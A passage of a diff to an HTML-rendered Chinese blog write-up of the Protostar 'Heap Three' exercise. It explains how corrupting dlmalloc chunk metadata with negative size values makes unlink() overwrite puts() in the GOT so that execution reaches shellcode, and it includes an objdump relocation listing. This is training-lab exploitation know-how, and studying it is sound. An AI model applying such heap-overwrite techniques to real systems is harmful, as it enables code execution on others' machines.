-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以及，如果 chunk 小于 80 bytes，那么 malloc 会使用另一个简化版的数据结构，被称为 &lt;code&gt;fastbin&lt;/code&gt;，而不是上述的双向链表&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;heap-three&#34;&gt;Heap Three&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -1272,215 +1103,102 @@ nextchunk -&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
 &lt;h2 id=&#34;before-unlink&#34;&gt;Before &lt;code&gt;unlink()&lt;/code&gt;&lt;/h2&gt;
 &lt;p&gt;我们的目标是把 &lt;code&gt;puts()&lt;/code&gt; 在动态链接表中记录的地址，写上能跳转到 &lt;code&gt;winner()&lt;/code&gt; 的 shellcode&lt;/p&gt;
-&lt;p&gt;而能帮我们达到以上目的的函数就是 &lt;code&gt;free()&lt;/code&gt;， 准确来说是 &lt;code&gt;unlink()&lt;/code&gt;，思路如下：&lt;/p&gt;
+&lt;p&gt;而能帮我们达到以上目的的函数就是 &lt;code&gt;free()&lt;/code&gt;， 准确来说是 &lt;code&gt;unlink()&lt;/code&gt;&lt;/p&gt;
 &lt;br&gt;
-&lt;p&gt;首先，我们所需要的地址有两个：&lt;strong&gt;&lt;code&gt;puts()&lt;/code&gt; 在 GOT 上的地址&lt;/strong&gt; 和 &lt;strong&gt;指向 &lt;code&gt;winner()&lt;/code&gt; shellcode 的地址&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;而前面提到的 &lt;code&gt;unlink()&lt;/code&gt; 是赋值的关键：&lt;/p&gt;
-&lt;p&gt;先看一遍完整的代码&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;       
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;            
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后接下来是解释：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/unlink.png&#34;
-	width=&#34;1364&#34;
-	height=&#34;1206&#34;
-	srcset=&#34;/p/protostar_heap_3/unlink_hu024e824d3d83b4bf15fc9447887d5f49_174732_480x0_resize_box_3.png 480w, /p/protostar_heap_3/unlink_hu024e824d3d83b4bf15fc9447887d5f49_174732_1024x0_resize_box_3.png 1024w&#34;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;关于 dlmalloc 的 unlink 漏洞，全部已经移动到了这里：&lt;a class=&#34;link&#34; href=&#34;/p/dlmalloc_unlink_vuln&#34; &gt;Dlmalloc Unlink Vulnerability&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;请看完那篇后再继续向下看&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;如果你看完了那篇，那么再结合一下这道题目，&lt;/p&gt;
+&lt;p&gt;heap3 首先依次创建了 chunkA, chunkB, chunkC 然后再反过来依次释放 chunkC, chunkB, chunkA&lt;/p&gt;
+&lt;p&gt;所以这道题是「向前 &lt;code&gt;unlink()&lt;/code&gt;」&lt;/p&gt;
+&lt;p&gt;需要满足的条件：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;不是 fastbin&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;不是通过 mmap 分配（已满足）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;Chunk&lt;/em&gt; 的 &lt;code&gt;PREV_INUSE&lt;/code&gt; 被标记为否&lt;/p&gt;
+&lt;p&gt;=&amp;gt; 会对 &lt;em&gt;Chunk&lt;/em&gt; 的 &lt;em&gt;相邻上一个 chunk&lt;/em&gt; 执行 &lt;code&gt;unlink()&lt;/code&gt;&lt;br&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;由于题目中的 &lt;code&gt;malloc()&lt;/code&gt; 大小是 &lt;em&gt;32&lt;/em&gt;，小于 &lt;em&gt;80&lt;/em&gt; 所以会使用 fastbin 结构，所以可以通过上面那篇文章的 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/dlmalloc_unlink_vuln/#trick-use-negative-size&#34; &gt;Trick: use negative size&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 章节，使用一个负数：&lt;code&gt;0xfffffffc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;那么将 size 设置为 &lt;code&gt;0xfffffffc = -4&lt;/code&gt; 就可以满足第一个条件&lt;/p&gt;
+&lt;p&gt;但是，如果我们是使用 BufferOverFlow 的方式，从 chunkA 开始去覆写 chunkB 的 size 的话，会导致 prev_size 也被覆盖上，&lt;/p&gt;
+&lt;p&gt;而且，既然是「向前 &lt;code&gt;unlink()&lt;/code&gt;」，那么 malloc 计算上一个 chunk 的方式是 &lt;code&gt;p - prev_size&lt;/code&gt;；如果 prev_size 是乱七八糟的数值，必定会导致 Segmentation fault&lt;/p&gt;
+&lt;p&gt;这时候可以再用一次负数，为了区分，就使用 &lt;code&gt;0xfffffff8 = -8&lt;/code&gt; 好了：而这样做的效果是，&lt;code&gt;p - prev_size&lt;/code&gt; = &lt;code&gt;p - -8&lt;/code&gt; = &lt;code&gt;p + 8&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;也就是说，&lt;em&gt;p&lt;/em&gt; 的 &lt;em&gt;prevchunk&lt;/em&gt; 出现在了 &lt;em&gt;p&lt;/em&gt; 的向后 0x8 的位置：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/fakechunk.png&#34;
+	width=&#34;1576&#34;
+	height=&#34;930&#34;
+	srcset=&#34;/p/protostar_heap_3/fakechunk_hu3a66c77e61e8fc895a1a83be27ed8b8a_220470_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_hu3a66c77e61e8fc895a1a83be27ed8b8a_220470_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
-		alt=&#34;when unlink&#34;
+		alt=&#34;fakechunk.png&#34;
 	
 	
 		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;113&#34;
-		data-flex-basis=&#34;271px&#34;
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;406px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;这张图有点迷惑&amp;hellip;就像 &lt;code&gt;P&lt;/code&gt; 这个 chunk 左边右边的 &lt;code&gt;BK&lt;/code&gt;，&lt;code&gt;FD&lt;/code&gt; 原来就存在一样&lt;/p&gt;
-&lt;p&gt;可是可是，实际上，这 &lt;code&gt;BK&lt;/code&gt; &lt;code&gt;FD&lt;/code&gt; 的判断依据是：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;BK = P-&amp;gt;bk;       
-FD = P-&amp;gt;fd;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以其实实际上 &lt;code&gt;FD&lt;/code&gt; &lt;code&gt;BK&lt;/code&gt; 是根据 &lt;code&gt;P&lt;/code&gt; 的 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; 和 &lt;code&gt;P-&amp;gt;bk&lt;/code&gt; 来决定的&lt;/p&gt;
-&lt;p&gt;另外，可以看到，在 &lt;code&gt;unlink()&lt;/code&gt; 之后，&lt;code&gt;BK-&amp;gt;fd&lt;/code&gt; 指向了 &lt;code&gt;FD&lt;/code&gt;，&lt;code&gt;FD-&amp;gt;bk&lt;/code&gt; 指向了 &lt;code&gt;BK&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;但&amp;hellip;换一个思路，前面的示意图里箭头看起来是「指向」，但是反过来，它实际做的事情其实是「赋值」：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FD-&amp;gt;bk = BK;            
-BK-&amp;gt;fd = FD;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以我们的目标就是在原来 &lt;code&gt;P&lt;/code&gt; 的 &lt;code&gt;fd&lt;/code&gt; 和 &lt;code&gt;bk&lt;/code&gt; 处写上别的地址&amp;hellip;就能欺骗 &lt;code&gt;unlink()&lt;/code&gt; 给这两个地址赋值&amp;hellip;？请继续往下看&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;还记得一个 chunk 的模型么，&lt;code&gt;prev_size&lt;/code&gt;, &lt;code&gt;size&lt;/code&gt;, &lt;code&gt;fd&lt;/code&gt;, &lt;code&gt;bk&lt;/code&gt; 都是 4 bytes&lt;/p&gt;
-&lt;p&gt;所以出现 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; 时，实际你可以将其看作 &lt;code&gt;P + 0x8&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;出现 &lt;code&gt;P-&amp;gt;bk&lt;/code&gt; 时，实际你可以将其看作 &lt;code&gt;P + 0xc&lt;/code&gt;&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;堆中一个已被 free 的 chunk 的模型&lt;/th&gt;
-&lt;th&gt;指针（↑表示在一格的起始处）&lt;/th&gt;
-&lt;th&gt;大小&lt;/th&gt;
-&lt;th&gt;可以视作&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;prev_size&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;↑ chunk begins (P)&lt;/td&gt;
-&lt;td&gt;4 bytes&lt;/td&gt;
-&lt;td&gt;P + 0x0&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;size&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;4 bytes&lt;/td&gt;
-&lt;td&gt;P + 0x4&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;fd&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;↑ mem begins&lt;/td&gt;
-&lt;td&gt;4 bytes&lt;/td&gt;
-&lt;td&gt;P + 0x8&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;bk&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;4 bytes&lt;/td&gt;
-&lt;td&gt;P + 0xc&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;如果我们把 &lt;code&gt;P-&amp;gt;bk&lt;/code&gt; 换成 &lt;code&gt;addr of shellcode&lt;/code&gt;，把 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; 换成 &lt;code&gt;addr of puts()&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;接下来详细展开一下三四步，等量替换：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;1.&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;    
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;2.&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;3.&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;↓&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;↓&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;equals&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;4.&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;↓&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;↓&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;equals&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;出现了！&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;addr of puts()+0xc&lt;/code&gt; = &lt;code&gt;addr of shellcode&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;这就是我们想要的结果！&lt;/p&gt;
-&lt;p&gt;但是还不太对，这边的 &lt;code&gt;addr of puts()&lt;/code&gt; 大了 &lt;code&gt;0xC&lt;/code&gt;，&lt;strong&gt;所以一开始就应该使 &lt;code&gt;P-&amp;gt;fd&lt;/code&gt; = &lt;code&gt;addr of puts() - 0xc&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;而且在第四步还出现了 &lt;code&gt;addr of shellcode+0x8 = addr of puts()&lt;/code&gt;，也就是说这个 shellcode + &lt;code&gt;0x8&lt;/code&gt; 的位置会被 &lt;code&gt;unlink()&lt;/code&gt; 写上 &lt;code&gt;addr of puts() - 0xc&lt;/code&gt;&amp;hellip;&lt;/p&gt;
-&lt;p&gt;所以 shellcode 得小于 8 bytes&amp;hellip;？&lt;/p&gt;
-&lt;p&gt;另外这张图里的红色绿色箭头看起来是「指向」，但你也应该知道&lt;strong&gt;与红色箭头的相反方向是在「赋值」&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/usingunlink.png&#34;
-	width=&#34;1026&#34;
-	height=&#34;992&#34;
-	srcset=&#34;/p/protostar_heap_3/usingunlink_hu6a56f0ff828b81547244061de558feee_167413_480x0_resize_box_3.png 480w, /p/protostar_heap_3/usingunlink_hu6a56f0ff828b81547244061de558feee_167413_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;usingunlink&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;103&#34;
-		data-flex-basis=&#34;248px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;实际上总体思路已经对了&amp;hellip;但实际实现起来会发现一个小问题&amp;hellip;在倒数第二节会提到&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;总之接下来找找到 &lt;code&gt;puts()&lt;/code&gt; 在动态链接表里的地址&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@protostar:/tmp/heap$ objdump -R /opt/protostar/bin/heap3
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/opt/protostar/bin/heap3:     file format elf32-i386
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DYNAMIC RELOCATION RECORDS
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OFFSET   TYPE              VALUE 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b0e4 R_386_GLOB_DAT    __gmon_start__
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b140 R_386_COPY        stderr
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b0f4 R_386_JUMP_SLOT   __errno_location
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b0f8 R_386_JUMP_SLOT   mmap
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b0fc R_386_JUMP_SLOT   sysconf
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b100 R_386_JUMP_SLOT   __gmon_start__
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b104 R_386_JUMP_SLOT   mremap
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b108 R_386_JUMP_SLOT   memset
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b10c R_386_JUMP_SLOT   __libc_start_main
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b110 R_386_JUMP_SLOT   sbrk
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0804b114 R_386_JUMP_SLOT   memcpy
